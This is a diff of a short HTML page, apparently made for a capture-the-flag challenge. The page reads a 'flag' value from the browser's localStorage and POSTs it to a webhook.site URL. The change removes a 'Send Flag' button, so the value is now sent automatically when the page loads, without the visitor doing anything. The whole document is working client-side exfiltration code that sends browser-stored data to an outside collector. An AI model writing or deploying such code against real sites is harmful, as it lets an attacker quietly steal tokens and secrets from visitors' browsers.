@@ -6,22 +6,25 @@
     <title>Send Flag or NoFlag</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            // Function to send a message to the webhook URL via POST request
-            const sendMessageToWebhook = (message) => {
-                const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flags';
-                console.log('Sending message:', message);  // Log the message being sent
+            // Define the webhook URL
+            const webhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flags';
 
+            // Function to send the message to the webhook via POST request
+            const sendMessageToWebhook = (message) => {
+                console.log('Sending message:', message); // Log the message
+
+                // Make the POST request with the message
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
-                        'Content-Type': 'application/json', // Indicate that the body is JSON
+                        'Content-Type': 'application/json', // Send the request as JSON
                     },
                     body: JSON.stringify({ message: message }), // Send the message in the request body
                 })
                 .then(response => {
-                    console.log('Response status:', response.status);  // Log the response status
+                    // Check if the response is OK and log the result
                     if (response.ok) {
-                        console.log('Message sent successfully:', message);
+                        console.log('Message sent successfully');
                         alert('Message sent successfully!');
                     } else {
                         console.error('Failed to send message. Status:', response.status);
@@ -38,25 +41,19 @@
             const storedFlag = localStorage.getItem('flag');
             console.log('Stored flag:', storedFlag);  // Log the stored flag value
 
+            // If a flag is stored, send it; otherwise, send 'noflag'
             if (storedFlag) {
-                console.log('Flag found:', storedFlag);  // Log if flag is found
-                // If flag is stored, show a button to send the flag
-                const sendButton = document.createElement('button');
-                sendButton.innerText = 'Send Flag';
-                sendButton.onclick = () => {
-                    sendMessageToWebhook(storedFlag); // Send the stored flag on button click
-                };
-                document.body.appendChild(sendButton);
+                console.log('Flag found:', storedFlag);
+                sendMessageToWebhook(storedFlag); // Send the stored flag
             } else {
                 console.log('No flag stored in localStorage.');
                 sendMessageToWebhook('noflag'); // Send 'noflag' if no flag is stored
-                alert('No flag found in localStorage. Sent "noflag".');
             }
         });
     </script>
 </head>
 <body>
     <h1>Send Flag or NoFlag</h1>
-    <p>If a flag is stored, you can send it to the specified webhook by clicking the button below. If no flag is stored, a "noflag" message will be sent automatically.</p>
+    <p>If a flag is stored in localStorage, it will be sent to the specified webhook. If no flag is stored, "noflag" will be sent automatically.</p>
 </body>
 </html>
